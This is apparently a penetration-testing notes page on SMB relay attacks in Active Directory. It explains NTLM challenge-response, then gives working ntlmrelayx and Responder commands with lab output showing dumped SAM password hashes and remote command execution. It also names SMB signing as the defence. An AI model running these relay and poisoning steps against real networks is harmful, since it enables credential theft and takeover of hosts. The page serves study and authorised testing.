---
title: SMB Relay Attack
description: SMB Relay Attack
categories: [Active Directory]
tags: [Active Direcotory, Initial Access, SMB, NTLM Authentication]
weight: 2
---

SMB supports NTLM authentication. The authentication flow goes as follows:
1. Client calculates NTLM hash from the user's password and sends the username to the server.
2. Server returns a random number called *nounce* as a **challenge**.
3. Client completes the challenge by encrypting the nounce using the NTLM hash and sending the **response** to the server.
4. If not part of an AD domain, the server encrypts the nounce itself and compare it to the ciphertext supplied by the client. If part of the AD domain, the server sends the client response to the **Domain Controller**, who does the comparison and tells the server if the response match or not.
5. If there is a match, the client is successfully authenticated.

This authentication follow is suspetible to a **Man-in-the-Middle** attack called SMB relay. The flow of the attack goes as follows:
1. Client initates connection to an **attacker controlled relay**.
2. Attacker relay connects to target server, relay client's username to target
3. Server responds the attacker relay with **NTLM challenge**.
4. Attacker relays the **NTLM challenge** to the client.
5. Client completes the challenges, sends attacker relay the **NTLM response**.
6. Attacker relays client's **NTLM response** to the target server.
7. Target server checks the response. If it's correct, access is granted to attacker relay.

## Attack Requirement
On both the machine where the NTLM authentication messages originate from and machine(s) the messages are relayed to, **SMB signing** either "enabled but not required" or disabled entirely. SMB signing prevents the attack entirely by adding a cryptographic signature (HMAC) to every message and using the signature to check for integrity and authenticity.

SMB signing configuration can be checked by using Nmap's default script scan (`-sC`).
```shell-session
╭─brian@iwakura ~
╰─$ nmap -sVC -p445 10.10.0.5
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-24 08:56 -0500
Nmap scan report for 10.10.0.5
Host is up (0.0019s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-03-24T13:56:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.38 seconds
```
Additionally, the user that connects to our SMB relay must also be local administrator on one or more of the targets for our attack to be effective.

## Exploitation Procedure
First, we build a list of targets.
```shell-session
╭─brian@iwakura ~
╰─$ cat targets.txt
10.10.0.3
10.10.0.4
10.10.0.5
```

Next, we will use Impacket `ntlmrelayx.py` (aka `impacket-ntlmrelayx`), a tool designed to relay NTLM authentication requests between two or more hosts.
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

When a victim tries to connect to our attacker machine via SMB, `ntlmrelayx` will relay authentication request between the victim machine and other specified targets on the network. If the user that tried to connect is a local administrator on one or more target machines, `ntlmrelayx` will, by default, dump the hashes stored in the SAM database on those machines.
```shell-session
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.3
[*] Authenticating against smb://10.10.0.3 as GUNDAM/AMURO.RAY SUCCEED
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.4
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[-] Authenticating against smb://10.10.0.4 as GUNDAM/AMURO.RAY FAILED
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[ParseResult(scheme='smb', netloc='GUNDAM\\AMURO.RAY@10.10.0.4', path='', params='', query='', fragment='')]
[*] SMBD-Thread-7 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.5
[*] Authenticating against smb://10.10.0.5 as GUNDAM/AMURO.RAY SUCCEED
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[*] Target system bootKey: 0x3142c8b7128c1c572d30bee6fac3e9c8
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:84684d325a64e9572a364eb95afbefdd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:f9b62f0b43ad35dc7117b302400f4726:::
[*] Done dumping SAM hashes for host: 10.10.0.5
```

Alternatively, we can also have `ntlmrelayx` execute a command with the `-c` option
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -C <cmd>
```
On every target host the user is a local administor of, the command will be executed.
```shell-session
╭─brian@iwakura ~
╰─$ sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c ipconfig
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
[...]
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.3
[*] Authenticating against smb://10.10.0.3 as GUNDAM/AMURO.RAY SUCCEED
[]
[*] SMBD-Thread-5 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.4
[-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[-] Authenticating against smb://10.10.0.4 as GUNDAM/AMURO.RAY FAILED
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[ParseResult(scheme='smb', netloc='GUNDAM\\AMURO.RAY@10.10.0.4', path='', params='', query='', fragment='')]
[*] SMBD-Thread-7 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, attacking target smb://10.10.0.5
[*] Authenticating against smb://10.10.0.5 as GUNDAM/AMURO.RAY SUCCEED
[*] All targets processed!
[*] SMBD-Thread-7 (process_request_thread): Connection from GUNDAM/AMURO.RAY@10.10.0.4 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Received connection from GUNDAM/amuro.ray at RX-0-UNICORN, connection will be relayed after re-authentication
[*] Executed specified command on host: 10.10.0.5

Windows IP Configuration


Ethernet adapter Ethernet:

Connection-specific DNS Suffix  . : goad.lab
Link-local IPv6 Address . . . . . : fe80::eab0:c944:1ec3:f2e9%12
IPv4 Address. . . . . . . . . . . : 10.10.0.5
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 10.10.0.1

[*] Stopping service RemoteRegistry
```

### Combining SMB Relay with LLMNR Poisoning
During a real engagement, unless via social engineering, users would rarely visit the SMB server hosted by the attacker. We can attract users more effectively by leveraging LLMNR poisoning, as the protocol allows us to respond to any LLMNR requests, directing users to the SMB relay hosted on our attacker machine. This dramatically increases the number of users who connects to our relay.

We can use Responder for LLMNR poisoning, but the SMB server must be disabled in its configuration (`/etc/responder/Responder.conf`) since `ntlmrelayx` is already listening on the SMB port.
```txt
[Responder Core]

; Servers to start
SQL = On
SMB = Off <---
RDP = On
Kerberos = On
FTP = On
```
We start responder after starting `ntlmrelayx`.
```bash
sudo responder -I <iface>
```

After we poison a LLMNR request we received, instead of Responder handling the NTLM authentication, `ntlmrelayx` relays authentication between each of the target and the connecting victim.
